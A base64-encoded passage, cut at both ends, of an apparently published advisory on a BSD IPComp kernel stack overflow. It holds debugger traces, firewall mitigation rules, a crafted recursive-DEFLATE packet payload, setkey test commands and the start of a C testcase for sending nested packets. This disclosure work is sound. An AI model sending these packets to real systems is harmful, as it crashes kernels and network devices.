Q4DQojMiAgMHhjMDFlYzMwMiBpbiBpcGNvbXA0X2lucHV0IChtPTB4YzE0ZTEzMDApIGF0IC4uLy4uLy4uLy4uL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jOjI0OA0KIzMgIDB4YzAxZWMzMDIgaW4gaXBjb21wNF9pbnB1dCAobT0weGMxNGUxMzAwKSBhdCAuLi8uLi8uLi8uLi9uZXRpbmV0Ni9pcGNvbXBfaW5wdXQuYzoyNDgNCiM0ICAweGMwMWVjMzAyIGluIGlwY29tcDRfaW5wdXQgKG09MHhjMTRlMTMwMCkgYXQgLi4vLi4vLi4vLi4vbmV0aW5ldDYvaXBjb21wX2lucHV0LmM6MjQ4DQojNSAgMHhjMDFlYzMwMiBpbiBpcGNvbXA0X2lucHV0IChtPTB4YzE0ZTEzMDApIGF0IC4uLy4uLy4uLy4uL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jOjI0OA0KIzYgIDB4YzAxZWMzMDIgaW4gaXBjb21wNF9pbnB1dCAobT0weGMxNGUxMzAwKSBhdCAuLi8uLi8uLi8uLi9uZXRpbmV0Ni9pcGNvbXBfaW5wdXQuYzoyNDgNClsgdHJpbW1lZCBdDQojMTQ4IDB4YzAxZWMzMDIgaW4gaXBjb21wNF9pbnB1dCAobT0weGMxNGUxMzAwKSBhdCAuLi8uLi8uLi8uLi9uZXRpbmV0Ni9pcGNvbXBfaW5wdXQuYzoyNDgNCiMxNDkgMHhjMDFlYzMwMiBpbiBpcGNvbXA0X2lucHV0IChtPTB4YzE0ZTEzMDApIGF0IC4uLy4uLy4uLy4uL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jOjI0OA0KIzE1MCAweGMwMTYyYmJiIGluIGlwX2lucHV0IChtPTB4YzE0ZTEzMDApIGF0IC4uLy4uLy4uLy4uL25ldGluZXQvaXBfaW5wdXQuYzoxMDU5DQojMTUxIDB4YzAxNjFiODIgaW4gaXBpbnRyICgpIGF0IC4uLy4uLy4uLy4uL25ldGluZXQvaXBfaW5wdXQuYzo0NzYNCiMxNTIgMHhjMDVkNjI0OCBpbiBzb2Z0aW50X2V4ZWN1dGUgKHNpPTB4Y2E3OWUxNTQsIGw9MHhjYTdhN2EwMCwgcz00KSBhdCAuLi8uLi8uLi8uLi9rZXJuL2tlcm5fc29mdGludC5jOjUzOQ0KIzE1MyAweGMwNWQ2MGU2IGluIHNvZnRpbnRfZGlzcGF0Y2ggKHBpbm5lZD0weGNhN2E3NTAwLCBzPTQpIGF0IC4uLy4uLy4uLy4uL2tlcm4va2Vybl9zb2Z0aW50LmM6ODExDQooZ2RiKSBpbmZvIGZyYW1lDQpTdGFjayBsZXZlbCAwLCBmcmFtZSBhdCAweGNhYjliZjA4Og0KIGVpcCA9IDB4YzAxZWJkNWMgaW4gaXBjb21wNF9pbnB1dCAoLi4vLi4vLi4vLi4vbmV0aW5ldDYvaXBjb21wX2lucHV0LmM6MTEyKTsgc2F2ZWQgZWlwIDB4YzAxZWMzMDINCiBjYWxsZWQgYnkgZnJhbWUgYXQgMHhjYWI5YmZhOA0KIHNvdXJjZSBsYW5ndWFnZSBjLg0KIEFyZ2xpc3QgYXQgMHhjYWI5YmYwMCwgYXJnczogbT0weGMxNGUxMzAwDQogTG9jYWxzIGF0IDB4Y2FiOWJmMDAsIFByZXZpb3VzIGZyYW1lJ3Mgc3AgaXMgMHhjYWI5YmYwOA0KIFNhdmVkIHJlZ2lzdGVyczoNCiAgZWJ4IGF0IDB4Y2FiOWJlZjgsIGVicCBhdCAweGNhYjliZjAwLCBlc2kgYXQgMHhjYWI5YmVmYywgZWlwIGF0IDB4Y2FiOWJmMDQNCihnZGIpIGluZm8gdGFyZ2V0DQpTeW1ib2xzIGZyb20gIm5ldGJzZC5nZGIiLg0KUmVtb3RlIHNlcmlhbCB0YXJnZXQgaW4gZ2RiLXNwZWNpZmljIHByb3RvY29sOg0KRGVidWdnaW5nIGEgdGFyZ2V0IG92ZXIgYSBzZXJpYWwgbGluZS4NCg0KVGhlcmVmb3JlLCBhbiBvb2Igc3Agd2lsbCB3cml0ZSBhdHRhY2tlciBjb250cm9sbGVkIGRhdGEuDQoNCihnZGIpIHRiIHBhbmljDQpUZW1wb3JhcnkgYnJlYWtwb2ludCAyLCBwYW5pYyAoZm10PTB4YzBhY2Y1NGIgInRyYXAiKSBhdCAuLi8uLi8uLi8uLi9rZXJuL3N1YnJfcHJmLmM6MTg0DQoxODQgICAgIGtwcmVlbXB0X2Rpc2FibGUoKTsNCihnZGIpIGJ0DQojMCAgcGFuaWMgKGZtdD0weGMwYWNmNTRiICJ0cmFwIikgYXQgLi4vLi4vLi4vLi4va2Vybi9zdWJyX3ByZi5jOjE4NA0KIzEgIDB4YzA2ZjA5MTkgaW4gdHJhcCAoZnJhbWU9MHhjYWM0OWY4NCkgYXQgLi4vLi4vLi4vLi4vYXJjaC9pMzg2L2kzODYvdHJhcC5jOjM2OA0KIzIgIDB4YzA2ZjA1NjYgaW4gdHJhcF90c3MgKHRzcz0weGMwY2ZlNWVjLCB0cmFwbm89MTMsIGNvZGU9MCkgYXQgLi4vLi4vLi4vLi4vYXJjaC9pMzg2L2kzODYvdHJhcC5jOjE5Nw0KIzMgIDB4YzAxMGNiMWIgaW4gPz8gKCkNCihnZGIpIGZyYW1lIDENCihnZGIpIGluZm8gc3ltYm9sIGZyYW1lLT50Zl9laXANCg0KZXRjLg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tDQpNaXRpZ2F0aW9uDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoqIFBsZWFzZSBub3RlLCB0aGlzIGRvY3VtZW50IGlzIGludGVuZGVkIGZvciBzZWN1cml0eSBwcm9mZXNzaW9uYWxzLCBuZXR3b3JrICAqDQoqIG9yIHN5c3RlbXMgYWRtaW5pc3RyYXRvcnMsIGFuZCB2ZW5kb3JzIG9mIG5ldHdvcmsgZXF1aXBtZW50IGFuZCBzb2Z0d2FyZS4gICAqDQoqIEVuZCB1c2VycyBuZWVkIG5vdCBiZSBjb25jZXJuZWQuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqDQoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZvciBudW1lcm91cyByZWFzb25zLCBpdCBpcyBhIGdvb2QgaWRlYSB0byBmaWx0ZXIgSVBDb21wIGF0IHRoZSBwZXJpbWV0ZXIgaWYgaXQgaXMNCm5vdCBleHBlY3RlZC4gRXZlbiB3aGVuIGltcGxlbWVudGVkIGNvcnJlY3RseSwgSVBDb21wIGNvbXBsZXRlbHkgZGVmZWF0cyB0aGUNCnB1cnBvc2Ugb2YgRGVsYXllZCBDb21wcmVzc2lvbiBpbiBPcGVuU1NIIChzZWUgQ0FOLTIwMDUtMjA5NiBmb3IgYW4gZXhhbXBsZSBvZg0Kd2h5IHlvdSBhbHdheXMgd2FudCBkZWxheWVkIGNvbXByZXNzaW9uKS4gQWRkaXRpb25hbGx5LCB0aGUgZW5jYXBzdWxhdGlvbiBtZWFucw0KYW55IGF0dGFja3MgdGhhdCByZXF1aXJlIGxpbmstbG9jYWwgYWNjZXNzIGNhbiBzaW1wbHkgYmUgd3JhcHBlZCBpbiBpcGNvbXAgYW5kDQphcmUgdGhlbiByb3V0YWJsZSAodGhhdCBpcyBub3QgZ29vZCkuDQoNCkFmZmVjdGVkIHNlcnZlcnMgYW5kIGRldmljZXMgY2FuIHVzZSBwYWNrZXQgZmlsdGVyaW5nIHRvIHByZXZlbnQgdGhlIHZ1bG5lcmFibGUNCmNvZGUgZnJvbSBiZWluZyBleGVyY2lzZWQuIE9uIHN5c3RlbXMgd2l0aCBpcGZ3LCBhIHJ1bGUgYmFzZWQgb24gdGhlIGZvbGxvd2luZw0KaXBmdy9pcGZ3NiB0ZW1wbGF0ZSBjYW4gYmUgdXNlZCwgYWRqdXN0IHRvIHdoaXRlbGlzdCBleHBlY3RlZCBwZWVycyBhcw0KYXBwcm9wcmlhdGUuDQoNCiMgaXBmdyBhZGQgZGVueSBwcm90byBpcGNvbXANCg0KT24gb3RoZXIgQlNEIHN5c3RlbXMsIHBmY3RsIHJ1bGVzIGNhbiBiZSBzdWJzdGl0dXRlZC4gU2VlIHZlbmRvciBkb2N1bWVudGF0aW9uIGZvcg0KaG93IHRvIGNvbmZpZ3VyZSBuZXR3b3JrIGFwcGxpYW5jZXMgdG8gZGVueSBJUENvbXAgYXQgbmV0d29yayBib3VuZGFyaWVzLg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tDQpTb2x1dGlvbg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KSSB3b3VsZCByZWNvbW1lbmQgdmVuZG9ycyBkaXNhbGxvdyBuZXN0ZWQgZW5jYXB1bGF0aW9uIG9mIGlwY29tcCBwYXlsb2Fkcy4gVGhlDQppbXBsZW1lbnRhdGlvbiBvZiB0aGlzIGZpeCB3aWxsIG9mIGNvdXJzZSB2YXJ5IGJ5IHByb2R1Y3QuDQoNCkJ5IHRoZSB0aW1lIHlvdSByZWFkIHRoaXMgYWR2aXNvcnksIGEgZml4IHNob3VsZCBoYXZlIGJlZW4gY29tbWl0dGVkIHRvIHRoZQ0KTmV0QlNEIHJlcG9zaXRvcnksIGRvd25zdHJlYW0gY29uc3VtZXJzIG9mIE5ldEJTRCBjb2RlIGFyZSBhZHZpc2VkIHRvIGltcG9ydA0KdGhlIGNoYW5nZXMgdXJnZW50bHkuDQoNCkEgZHJhZnQgcGF0Y2ggZnJvbSBTLlAuWmVpZGxlciBvZiB0aGUgTmV0QlNEIHByb2plY3QgaXMgYXR0YWNoZWQgZm9yIHJlZmVyZW5jZS4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQ3JlZGl0DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpUaGlzIGJ1ZyB3YXMgZGlzY292ZXJlZCBieSBUYXZpcyBPcm1hbmR5Lg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tDQpHcmVldHoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkdyZWV0eiB0byBIYXdrZXMsIEp1bGllbiwgTGlxdWlkSywgTGNhbXR1ZiwgTmVlbCwgU3Bvb25tLCBGZWxpeCwgUm9iZXJ0LA0KQXNpcmFwLCBNZWRlciwgU3BlbmRlciwgUGlwYWNzLCBHeW52YWVsLCBTY2FyeWJlYXN0cywgUmVkcGlnLCBLZWVzLCBFdWdlbmUsDQpCcnVjZSBELiwgZGptLCBCcmlhbiBDLiwgZGpyYmxpc3MsIGpvbm8sIGFuZCBhbGwgbXkgb3RoZXIgZWxpdGUgZnJpZW5kcyBhbmQNCmNvbGxlYWd1ZXMuDQoNCkFuZCBvZiBjb3Vyc2UsICQxJGtrMXE4NVhwJElkLmdBY0pPZzd1ZWxmMzZWUXdKUS8uDQoNCkFkZGl0aW9uYWwgdGhhbmtzIHRvIEphbiwgRmVsaXggYW5kIE1lZGVyIGZvciB0aGVpciBtYWQgeG51IHNraWxsei4NCg0KSmFuIGhlbHBzIG9yZ2FuaXplIGEgc2VjdXJpdHkgY29uZmVyZW5jZSBjYWxsZWQgI2RheXMgaGVsZCBpbiBMdWNlcm5lLA0KU3dpdHplcmxhbmQgKGEgdmVyeSBwaWN0dXJlc3F1ZSBTd2lzcyBjaXR5KS4gVGhlIENGUCBpcyBjdXJyZW50bHkgb3BlbiwgeW91DQpzaG91bGQgY2hlY2sgaXQgb3V0IGF0IGh0dHBzOi8vd3d3Lmhhc2hkYXlzLmNoLy4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLQ0KTm90ZXMNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkFuIGVsZWdhbnQgbWV0aG9kIG9mIHJlcHJvZHVjaW5nIHRoaXMgZmxhdyB3b3VsZCBiZSB1c2luZyBzZWxmLXJlcHJvZHVjaW5nDQpMZW1wZWwtWml2IHByb2dyYW1zLCByc2MgZGVzY3JpYmVzIHRoZSB0ZWNobmlxdWUgaGVyZToNCg0KaHR0cDovL3Jlc2VhcmNoLnN3dGNoLmNvbS8yMDEwLzAzL3ppcC1maWxlcy1hbGwtd2F5LWRvd24uaHRtbA0KDQpUaGlzIG1ldGhvZCB3b3VsZCBhbHNvIGJlIGFibGUgdG8gZGlzcnVwdCBub24tcmVjdXJzaXZlIGltcGxlbWVudGF0aW9ucyB0aGF0DQpkbyBub3QgcHJldmVudCBuZXN0ZWQgZW5jYXB1bGF0aW9uLCBzdWNoIGFzIG1vZGVybiBGcmVlQlNEIGFuZCBPcGVuQlNELg0KUGVyaGFwcyB0aGlzIHdpbGwgYWxzbyBhZmZlY3Qgb3RoZXIgbm9uLUJTRCBpbXBsZW1lbnRhdGlvbnMuIEFuIGlwY29tcA0KcXVpbmUgaXMgZGVmaW5lZCBiZWxvdyBpbiBHTlUgQyBzeW50YXggYmVsb3csIGFuZCBhIHRlc3RjYXNlIGZvciBMaW51eA0KaXMgYXR0YWNoZWQgdG8gdGhpcyBtYWlsLg0KDQoNCiAgICBzdHJ1Y3Qgew0KICAgICAgICB1aW50OF90ICAgICBjb21wX254dDsgICAgICAgLy8gTmV4dCBIZWFkZXINCiAgICAgICAgdWludDhfdCAgICAgY29tcF9mbGFnczsgICAgIC8vIFJlc2VydmVkLCBtdXN0IGJlIHplcm8NCiAgICAgICAgdWludDE2X3QgICAgY29tcF9jcGk7ICAgICAgIC8vIENvbXByZXNzaW9uIHBhcmFtZXRlciBpbmRleA0KICAgICAgICB1aW50OF90ICAgICBjb21wX2RhdGFbMTgwXTsgLy8gUGF5bG9hZA0KICAgIH0gaXBjb21wID0gew0KICAgICAgICAgICAgLmNvbXBfbnh0ICAgICAgID0gSVBQUk9UT19DT01QLA0KICAgICAgICAgICAgLmNvbXBfZmxhZ3MgICAgID0gMCwNCiAgICAgICAgICAgIC5jb21wX2NwaSAgICAgICA9IGh0b25zKElQQ09NUF9ERUZMQVRFKSwNCiAgICAgICAgICAgIC5jb21wX2RhdGEgICAgICA9IHsNCiAgICAgICAgICAgICAgICAweGNhLCAweDYxLCAweDYwLCAweDYwLCAweDAyLCAweDAwLCAweDBhLCAweDAwLCAweGY1LCAweGZmLA0KICAgICAgICAgICAgICAgIDB4Y2EsIDB4NjEsIDB4NjAsIDB4NjAsIDB4MDIsIDB4MDAsIDB4MGEsIDB4MDAsIDB4ZjUsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHgwMiwgMHhiMywgMHhjMCwgMHgyYywgMHgwMCwgMHgwMCwgMHgwNSwgMHgwMCwgMHhmYSwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDAyLCAweGIzLCAweGMwLCAweDJjLCAweDAwLCAweDAwLCAweDA1LCAweDAwLCAweGZhLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4MDAsIDB4MDUsIDB4MDAsIDB4ZmEsIDB4ZmYsIDB4MDAsIDB4MTQsIDB4MDAsIDB4ZWIsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHgwMiwgMHhiMywgMHhjMCwgMHgyYywgMHgwMCwgMHgwMCwgMHgwNSwgMHgwMCwgMHhmYSwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDAwLCAweDA1LCAweDAwLCAweGZhLCAweGZmLCAweDAwLCAweDE0LCAweDAwLCAweGViLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4NDIsIDB4ODgsIDB4MjEsIDB4YzQsIDB4MDAsIDB4MDAsIDB4MTQsIDB4MDAsIDB4ZWIsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHg0MiwgMHg4OCwgMHgyMSwgMHhjNCwgMHgwMCwgMHgwMCwgMHgxNCwgMHgwMCwgMHhlYiwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDQyLCAweDg4LCAweDIxLCAweGM0LCAweDAwLCAweDAwLCAweDE0LCAweDAwLCAweGViLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4NDIsIDB4ODgsIDB4MjEsIDB4YzQsIDB4MDAsIDB4MDAsIDB4MTQsIDB4MDAsIDB4ZWIsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHg0MiwgMHg4OCwgMHgyMSwgMHhjNCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDAwLCAweDAwLCAweDAwLCAweGZmLCAweGZmLCAweDAwLCAweDBmLCAweDAwLCAweGYwLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4NDIsIDB4ODgsIDB4MjEsIDB4YzQsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4ZmYsIDB4ZmYsDQogICAgICAgICAgICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZiwgMHgwMCwgMHgwZiwgMHgwMCwgMHhmMCwgMHhmZiwNCiAgICAgICAgICAgICAgICAweDgyLCAweDcyLCAweDYxLCAweDVjLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweGZmLCAweGZmLA0KICAgICAgICAgICAgICAgIDB4MDEsIDB4MDAsIDB4MDAsIDB4ZmYsIDB4ZmYsIDB4ODIsIDB4NzIsIDB4NjEsIDB4NWMsIDB4MDAsDQogICAgICAgICAgICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZiwgMHgwMSwgMHgwMCwgMHgwMCwgMHhmZiwgMHhmZg0KICAgICAgICAgICAgfQ0KICAgIH07DQoNCg0KTm90ZSB0aGF0IG1vZGVybiBGcmVlQlNEIGFuZCBPcGVuQlNEIGFwcGVhciB0byBkcm9wIGluY29taW5nIGlwY29tcCBwYWNrZXRzIGlmDQpubyBUQkQgZW50cmllcyBhcmUga25vd24gKHNlZSBuZXRzdGF0IC1zIC1wIGlwY29tcCBzdGF0aXN0aWNzLCBhbmQNCnRoZSBzZXRrZXkgZG9jdW1lbnRhdGlvbikuIFlvdSB3aWxsIGhhdmUgdG8gYWxsb3cgZm9yIHRoaXMgd2hpbGUNCnRlc3RpbmcuIERlcGVuZGluZyBvbiBpbXBsZW1lbnRhdGlvbiwgWW91IG1heSBhbHNvIG5lZWQgdG8gc3Bvb2YgdGhlDQpzb3VyY2UgYWRkcmVzcyBvZiBhIHBlZXIsIHNlZSBtYW4gNyByYXcuDQoNClNwZWNpYWwgdGhhbmtzIHRvIHJzYyBhbmQgTWF0dGhldyBEZW1wc2t5IGZvciBoaW50cyBhbmQgYXNzaXN0YW5jZS4NCg0KU29tZXRoaW5nIGxpa2UgdGhpcyBtYXkgYmUgdXNlZnVsIGZvciB0ZXN0aW5nOg0KDQojIHNldGtleSAtYw0KYWRkIDE5Mi4xNjguMC4xIDE5Mi4xNjguMC4yIGlwY29tcCAwMDAyIC1DIGRlZmxhdGUNCl5EDQoNCi0NCg0KSSB3b3VsZCBhZHZpc2UgY2F1dGlvbiB3aGVuIHNlbmRpbmcgbWFsZm9ybWVkIG9yIHBhdGhvbG9naWNhbCBwYWNrZXRzDQphY3Jvc3MgY3JpdGljYWwgaW5mcmFzdHJ1Y3R1cmUgb3IgdGhlIHB1YmxpYyBpbnRlcm5ldCwgbWFueSBlbWJlZGRlZCBkZXZpY2VzDQphcmUgYmFzZWQgb24gQlNELWRlcml2ZWQgY29kZSBhbmQgbWF5IG5vdCBoYW5kbGUgdGhlIGVycm9yIGdyYWNlZnVsbHkuDQoNCi0NCg0KSnVsaWVuIHdpbGwgYmUgYW5ncnkgSSBkaWRuJ3QgdXNlIHNjYXB5LCBzb3JyeSEgSSBhbSBhIGZhbiA6LSkNCg0KLQ0KDQpBIGJ1ZyBpbiBYbnUncyBjdXN0b20gYWxsb2NhdG9yIGZvciB6bGliIChkZWZsYXRlX2FsbG9jKSBjYXVzZXMgemxpYg0KaW5pdGlhbGlzYXRpb24gdG8gZmFpbCBpZiB+MWsgYnl0ZXMgaXMgbm90IGF2YWlsYWJsZSB0byBNQUxMT0MoKSB3aXRoIE1fTk9XQUlULA0KZXZlbiB0aG91Z2ggTV9XQUlUT0sgd2FzIGludGVuZGVkLCBhcyBkZXNjcmliZWQgaW4gdGhlIGNvbW1lbnRzOg0KDQogICAgICAgIC8qDQogICAgICAgICAqIEF2ZXJ0IHlvdXIgZ2F6ZSwgdWdseSBoYWNrIGZvbGxvd3MhDQogICAgICAgICAqIFdlIGluaXQgaGVyZSBzbyBvdXIgbWFsbG9jIGNhbiBhbGxvY2F0ZSB1c2luZyBNX1dBSVQuDQogICAgICAgICAqIFdlIGRvbid0IHdhbnQgdG8gYWxsb2NhdGUgaWYgaXBjb21wIGlzbid0IHVzZWQsIGFuZCB3ZQ0KICAgICAgICAgKiBkb24ndCB3YW50IHRvIGFsbG9jYXRlIG9uIHRoZSBpbnB1dCBvciBvdXRwdXQgcGF0aC4NCiAgICAgICAgICogQWxsb2NhdGlvbiBmYWlscyBpZiB3ZSB1c2UgTV9OT1dBSVQgYmVjYXVzZSBpbml0IGFsbG9jYXRlcw0KICAgICAgICAgKiBzb21ldGhpbmcgbGlrZSAyNTZrIChvdWNoKS4NCiAgICAgICAgICovDQoNCkhvd2V2ZXIgd2l0aCBzb21lIGNyZWF0aXZpdHkgaXQgaXMgcG9zc2libGUgdG8gbWFrZSB0aGUgYWxsb2NhdGlvbiBzdWNjZWVkLiBZb3UNCmNhbiBvYnNlcnZlIHRoaXMgYnVnIGJ5IHNlbmRpbmcgYW4gaXBjb21wIHBhY2tldCBhbmQgbG9va2luZyBmb3IgdGhlIG1lbW9yeQ0KYWxsb2NhdGlvbiBmYWlsdXJlIGluIHRoZSBuZXR3b3JrIHN0YXRpc3RpY3MgKHRyeSBzb21ldGhpbmcgbGlrZSBgbmV0c3RhdCAtcyB8DQpncmVwIC1BMTYgaXBzZWM6YCkuIFlvdSBjYW4gYWxzbyBzZXQgYHN5c2N0bCAtdyBuZXQuaW5ldC5pcHNlYy5kZWJ1Zz0xYC4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLQ0KUmVmZXJlbmNlcw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KLSBodHRwOi8vcmVzZWFyY2guc3d0Y2guY29tLzIwMTAvMDMvemlwLWZpbGVzLWFsbC13YXktZG93bi5odG1sDQogIHJlc2VhcmNoIXJzYzogWmlwIEZpbGVzIEFsbCBUaGUgV2F5IERvd24NCi0gaHR0cDovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjMzE3Mw0KICBSRkMzMTczOiBJUCBQYXlsb2FkIENvbXByZXNzaW9uIFByb3RvY29sIChJUENvbXApDQotIGh0dHA6Ly9jdnN3ZWIubmV0YnNkLm9yZy9ic2R3ZWIuY2dpL3NyYy9zeXMvbmV0aW5ldDYvaXBjb21wX2lucHV0LmM/cmV2PTEuMzYmY29udGVudC10eXBlPXRleHQveC1jdnN3ZWItbWFya3VwJm9ubHlfd2l0aF90YWc9TUFJTg0KICBOZXRCU0Q6IGlwY29tcF9pbnB1dC5jLCB2MS4zNg0KLSBodHRwOi8vd3d3Lm9wZW5zb3VyY2UuYXBwbGUuY29tL3NvdXJjZS94bnUveG51LTE0NTYuMS4yNi9ic2QvbmV0aW5ldDYvaXBjb21wX2lucHV0LmMNCiAgWG51OiBpcGNvbXBfaW5wdXQuYw0KLSBodHRwOi8vZGV2ZWxvcGVyLmFwcGxlLmNvbS9saWJyYXJ5L21hYy8jZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjgvaXBmdy44Lmh0bWwNCiAgaXBmdyAtLSBJUCBmaXJld2FsbCBhbmQgdHJhZmZpYyBzaGFwZXIgY29udHJvbCBwcm9ncmFtDQotIGh0dHA6Ly93d3cubmV0YnNkLm9yZy9kb2NzL25ldHdvcmsvcGYuaHRtbA0KICBUaGUgTmV0QlNEIFBhY2tldCBGaWx0ZXIgKGdlbmVyYWxseSBhcHBsaWVzIHRvIG90aGVyIHBvcHVsYXIgQlNEcykuDQotIGh0dHA6Ly9meHIud2F0c29uLm9yZy9meHIvc291cmNlL25ldGluZXQ2L2lwY29tcF9pbnB1dC5jP3Y9RlJFRUJTRDY0I0wyMjINCiAgRWFybGllciB2ZXJzaW9ucyBvZiBGcmVlQlNEIHdlcmUgaW1wbGVtZW50ZWQgcmVjdXJzaXZlbHksIHRoZSBjb2RlIHdhcyBzaW5jZSByZWZhY3RvcmVkLg0KLSBodHRwOi8vZnhyLndhdHNvbi5vcmcvZnhyL3NvdXJjZS9uZXRpcHNlYy94Zm9ybV9pcGNvbXAuYz92PUZSRUVCU0Q4MSNMMjk5DQogIFRoZSBjdXJyZW50IHZlcnNpb24gaXMgaW1wbGVtZW50ZWQgaXRlcmF0aXZlbHkgKHNlZSBOT1RFUyBzZWN0aW9uIG9uIFF1aW5lIERvUykuDQotIGh0dHA6Ly93d3cuZm9yY2UxMG5ldHdvcmtzLmNvbS9wcm9kdWN0cy9mdG9zLmFzcA0KICBGVE9TIC0gRm9yY2UxMCBPcGVyYXRpbmcgU3lzdGVtDQotIGh0dHA6Ly93d3cucW54LmNvbS9kZXZlbG9wZXJzL2RvY3MvNi40LjEvaW8tcGt0X2VuL3VzZXJfZ3VpZGUvZHJpdmVycy5odG1sDQogIFFOWCBOZXR3b3JrIERyaXZlcnMgRG9jdW1lbnRhdGlvbg0KDQpTdXBwb3J0IGhpZ2gtcXVhbGl0eSBqb3VybmFsaXNtIGluIGluZm9ybWF0aW9uIHNlY3VyaXR5IGJ5IHN1YnNjcmliaW5nIHRvIExXTg0KaHR0cDovL2x3bi5uZXQvIChpIGhhdmUgbm8gY29ubmVjdGlvbiB0byBsd24gb3RoZXIgdGhhbiBhcHByZWNpYXRpbmcgdGhlaXINCndvcmspLg0KDQpJIGhhdmUgYSB0d2l0dGVyIGFjY291bnQgd2hlcmUgSSBvY2Nhc2lvbmFsbHkgY29tbWVudCBvbiBzZWN1cml0eSB0b3BpY3MuDQoNCmh0dHA6Ly90d2l0dGVyLmNvbS90YXZpc28NCg0KZXgkJA0KDQotLSANCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnRhdmlzbyBhdCBjbXB4Y2hnOGIuY29tIHwgcGdwIGVuY3J5cHRlZCBtYWlsIHByZWZlcnJlZA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KLS0tLS0tLS0tLS0tLS0gbmV4dCBwYXJ0IC0tLS0tLS0tLS0tLS0tDQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2lwLmg+DQojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx6bGliLmg+DQojaW5jbHVkZSA8YWxsb2NhLmg+DQojaW5jbHVkZSA8c3RkYm9vbC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KDQovLw0KLy8gQlNEIElQQ29tcCBLZXJuZWwgU3RhY2sgT3ZlcmZsb3cgVGVzdGNhc2UNCi8vICAtLSBUYXZpcyBPcm1hbmR5IDx0YXZpc28gYXQgY21weGNoZzhiLmNvbT4sIE1hcmNoIDIwMTENCi8vDQoNCiNkZWZpbmUgTUFYX1BBQ0tFVF9TSVpFICgxMDI0ICogMTAyNCAqIDMyKQ0KI2RlZmluZSBNQVhfRU5DQVBfREVQVEggMTAyNA0KDQplbnVtIHsNCiAgICBJUENPTVBfT1VJICAgICAgICAgID0gMSwNCiAgICBJUENPTVBfREVGTEFURSAgICAgID0gMiwNCiAgICBJUENPTVBfTFpTICAgICAgICAgID0gMywNCiAgICBJUENPTVBfTUFYLA0KfTsNCg0Kc3RydWN0IGlwY29tcCB7DQogICAgdWludDhfdCAgICAgY29tcF9ueHQ7ICAgICAgIC8vIE5leHQgSGVhZGVyDQogICAgdWludDhfdCAgICAgY29tcF9mbGFnczsgICAgIC8vIFJlc2VydmVkLCBtdXN0IGJlIHplcm8NCiAgICB1aW50MTZfdCAgICBjb21wX2NwaTsgICAgICAgLy8gQ29tcHJlc3Npb24gcGFyYW1ldGVyIGluZGV4DQogICAgdWludDhfdCAgICAgY29tcF9kYXRhWzBdOyAgIC8vIFBheWxvYWQuDQp9Ow0KDQpib29sIGlwY29tcF9lbmNhcHN1bGF0ZV9kYXRhKHZvaWQgICAgICAgICAgICpkYXRhLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaXplX3QgICAgICAgICAgc2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ICAgICAgICAgICAgIG54dCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RydWN0IGlwY29tcCAqKm91dCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZV90ICAgICAgICAgKmxlbmd0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ICAgICAgICAgICAgIGxldmVsKQ0Kew0KICAgIHN0cnVjdCBpcGNvbXAgKmlwY29tcDsNCiAgICB6X3N0cmVhbSAgICAgICB6c3RyZWFtOw0KDQogICAgaXBjb21wICAgICAgICAgICAgICA9IG1hbGxvYy